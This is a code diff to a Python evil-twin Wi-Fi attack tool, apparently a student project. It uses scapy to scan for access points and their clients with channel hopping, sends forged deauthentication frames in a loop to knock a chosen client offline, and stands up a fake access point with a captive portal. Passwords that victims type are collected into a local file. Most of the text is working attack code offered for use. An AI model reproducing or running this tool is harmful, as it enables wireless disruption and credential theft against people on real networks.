@@ -12,10 +12,13 @@ channel_list = []
 client_list = []
 user_interface = ""
 ap_to_attack = ""
+channel = 1
+stop_change = False
 stop = False
 
 
 def network_scanning():
+    global stop_change
     print("START scanning for access points for a minute")
     print("To stop before timeout -> press CTRL+C\n")
     print("INDEX           MAC              SSID                       CHANNEL")
@@ -24,7 +27,13 @@ def network_scanning():
     so that we get only packets that are relevant to us,
     in addition on each of the packets we will run the function AP_filter
     """
-    sniff(iface=user_interface, prn=AP_filter, timeout=60)
+    channel_changer = Thread(target=change_channel)
+    channel_changer.daemon = True
+    channel_changer.start()
+
+    sniff(iface=user_interface, prn=AP_filter)  # , timeout=60)
+
+    stop_change = True
 
 
 def AP_filter(packet):
@@ -48,6 +57,19 @@ def AP_filter(packet):
                       packet.addr2, packet.info.decode("utf-8"), packet.channel))
 
 
+def change_channel():
+    global channel
+    ch = 1
+
+    while True:
+        os.system(f"iwconfig {user_interface} channel {channel}")
+        # switch channel from 1 to 14 each 0.5s
+        channel = channel % 14 + 1
+        time.sleep(0.5)
+        if stop_change:
+            break
+
+
 def users_scanning():
     print("\nSTART scanning for connected clients ..")
     print("To stop -> press CTRL+C\n")
@@ -63,23 +85,47 @@ def users_scanning():
 def users_filter(packet):
     global client_list
     """
-    this function check if the type of the packet is data type and if he connect to the desire AP, 
-    if so, it will append the client into a list who saves all the clients.
-    addr2 - source mac address of sender
-    addr3- MAC address of AP 
+    this function checks whether the frame was not sent from ds, if so, it checks if it was sent to
+    the AP we want ta attack.
+    if the mac assresses equals, it will append the client into a list who saves all the clients.
+    addr1= ap_mac
+    addr2= client_mac (frame sender)
     """
 
+    if packet.FCfield:
+        DS = packet.FCfield & 0x3
+        to_ds = DS & 0x1 != 0
+        from_ds = DS & 0x2 != 0
+
+        if to_ds and not from_ds:
+            if packet.addr1 == ap_to_attack and packet.addr2 not in client_list:
+                client_list.append(packet.addr2)
+                print(" ", len(client_list), "          ", packet.addr2)
+
+
+def to_AP(sender, reciver, iface):
+    """
+    this function create fake Deauthentication packets from AP to client and send them.
+    toDS = 1, fromDS = 0
+    addr1- BSSID (AP)
+    addr2- Source (client)
+    addr3- Dest (AP)
+    """
     try:
-        if packet.addr3 == ap_to_attack and packet.addr2 not in ap_list and packet.addr2 not in client_list:
-            client_list.append(packet.addr2)
-            print(" ", len(client_list), "          ", packet.addr2)
+        dot11 = Dot11(type=0, subtype=12, addr1=reciver, addr2=sender, addr3=reciver)
+        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)  # create attack frame
+        sendp(packet, inter=0.1, count=100, iface=iface, verbose=0)
     except:
         pass
 
 
-def send_packets(sender, reciver, iface):
+def to_client(sender, reciver, iface):
     """
-    this function create fake Deauthentication packets and send them.
+    this function create fake Deauthentication packets from client to AP and send them.
+    toDS = 0, fromDS = 1
+    addr1- Dest (client)
+    addr2- Source (AP)
+    addr3- BSSID (AP)
     """
     try:
         dot11 = Dot11(type=0, subtype=12, addr1=reciver, addr2=sender, addr3=sender)
@@ -87,7 +133,6 @@ def send_packets(sender, reciver, iface):
         sendp(packet, inter=0.1, count=100, iface=iface, verbose=0)
     except:
         pass
-
 
 
 def disconnect(target_mac, ap_attack_mac, interface_name):
@@ -105,45 +150,20 @@ def disconnect(target_mac, ap_attack_mac, interface_name):
     """
     global stop
     while True:
-        send_packets(target_mac, ap_attack_mac, interface_name) #ap to client
-        send_packets(ap_attack_mac, target_mac, interface_name) #client to ap
+        to_client(target_mac, ap_attack_mac, interface_name)  # ap to client
+        to_AP(ap_attack_mac, target_mac, interface_name)  # client to ap
         if stop:
             break
-
-
-def start_apache():
-    """
-    this function forward our captive portal directory
-    and start the apache2 server which will be our Main Server.
-    also it defines the apache conf file (000-default).
-    we've been helped with:
-
-    """
-    os.system('sudo rm -r /var/www/html/* 2>/dev/null')  # delete all folders and files in this directory
-    os.system('sudo cp -r Captivportal/* /var/www/html')
-    os.system('sudo chmod 777 /var/www/html/*')
-    os.system('sudo chmod 777 /var/www/html')
-
-    # update rules inside 000-default.conf of apache2
-    os.system('sudo cp -f 000-default.conf /etc/apache2/sites-enabled')
-    os.system('a2enmod rewrite >/dev/null 2>&1')  # enable the mod_rewrite in apache
-    os.system('a2enmod php' + str(8.1) + ' >/dev/null 2>&1')  # enable php8.1 module in apache
-    os.system('sudo systemctl restart apache2 >/dev/null 2>&1')
-
-
-def set_settings(fap_iface, ssid, channel):
-    """
-    this function create 2 conf fils --> dnsmasq.conf, hostapd.conf
-    also, it defines new rules in iptables
-    """
-    cf.create_hostapd_file(fap_iface, ssid, channel)
-    cf.create_dnsmasq_file(fap_iface)
 
 
 def restart(interface):
     """
     this function doing reset to the setting we were set.
     """
+
+    # kill all dnsmasq process
+    # Delete the configuration files
+
     os.system('service NetworkManager start')
     os.system('service apache2 stop >/dev/null 2>&1')
     os.system('service hostapd stop >/dev/null 2>&1')
@@ -152,16 +172,18 @@ def restart(interface):
     os.system("killall hostapd >/dev/null 2>&1")
     os.system('iptables -F')
     os.system('iptables -t nat -F')
-    os.system("rm dnsmasq.conf")
-    os.system("rm hostapd.conf")
+    os.system("sudo rm hostapd.conf dnsmasq.conf")
     os.system("sudo systemctl unmask systemd-resolved >/dev/null 2>&1")
     os.system("sudo systemctl enable systemd-resolved >/dev/null 2>&1")
     os.system("sudo systemctl start systemd-resolved >/dev/null 2>&1")
+    os.system("sudo rm /etc/resolv.conf")
+    os.system("sudo ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf")
     mm.Stop_Monitor_Mode(interface)
 
 
 def main_attack():
-    global user_interface, ap_to_attack, stop
+    global user_interface, ap_to_attack, stop, channel
+    os.system('service NetworkManager stop')
     user_interface = input("please enter the interface name you want to sniff on: ")
     fake_ap_interface = input("please enter the interface name you want for your fake AP: ")
 
@@ -176,11 +198,11 @@ def main_attack():
     if len(ap_list) > 0:
         print("\n")
         index = int(input("Please enter the index of the SSID that you want to attack: ")) - 1
-        channel_of_attack = channel_list[index]
+        channel = channel_list[index]
         print("YOU CHOSE ->  ", ssid_list[index])
 
         # change the interface channel
-        os.system("iwconfig " + user_interface + " channel " + str(channel_of_attack))
+        os.system("iwconfig " + user_interface + " channel " + str(channel))
 
         # save the Attacked AP details
         ap_to_attack = ap_list[index]
@@ -192,36 +214,31 @@ def main_attack():
         # ----------- STEP 5 - Choose client to attack -----------
         if len(client_list) > 0:
             index = int(input("\nPlease enter the index of the client MAC that you want to attack: ")) - 1
-            print("YOU CHOSE ->  ", client_list[index])
+            print(f'YOU CHOSE ->  {client_list[index]}')
             user_mac = client_list[index]
 
-            # ----------- STEP 6 - Disconnect the user from AP -----------
+            # ----------- STEP 6 + 7 - Create CaptivePortal && AP ------------
+            # we need to create two conf files -> dnsmasq.conf, hostapd.conf, set up
+            # the settings in iptables and start the appache server.
+
+            cf.set_settings(fake_ap_interface, ssid_to_attack, channel)
+
+            # ----------- STEP 8 - Disconnect the user from AP -----------
             # we will send deauthentication notification to the client and to ap.
             # it will keep sending as the program is running.
+
             print("\nStart deauthentication attack..")
             disconnect_thread = threading.Thread(target=disconnect, args=(user_mac, ap_to_attack, user_interface),
                                                  daemon=True)
             disconnect_thread.start()
             time.sleep(3)
 
-            # ----------- STEP 7 - Create CaptivePortal -----------
-            start_apache()
-            print('\nappache server start successfully')
-            time.sleep(1)
-
-            # ----------- STEP 8 - Create fake AP -----------
-            # we need to create two conf files -> dnsmasq.conf, hostapd.conf
-            # and to set up the settings in iptables.
-            set_settings(fake_ap_interface, ssid_to_attack, channel_of_attack)
-            print('\ndnsmaq.conf & hostapd.conf create successfully')
-            time.sleep(2)
-
-            # ----------- STEP 9 - Clean and Exit the program -----------
+            # # ----------- STEP 9 - Clean and Exit the program -----------
             empty = input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
             stop = True
 
-            os.system("cat /var/www/html/passwords.txt")
-            time.sleep(10)
+            os.system('cat /var/www/html/passwords.txt >> Captivportal/passwords.txt')
+            time.sleep(5)
             restart(user_interface)  # reset all the settings
             os.system("clear")
             time.sleep(2)
@@ -229,11 +246,14 @@ def main_attack():
 
         else:
             print("There is not connected client to attack")
+            os.system('service NetworkManager start')
 
     else:
         print("There is not available AP to attack")
+        os.system('service NetworkManager start')
 
 
 if __name__ == '__main__':
     main_attack()
     print("bye")
+    time.sleep(2)
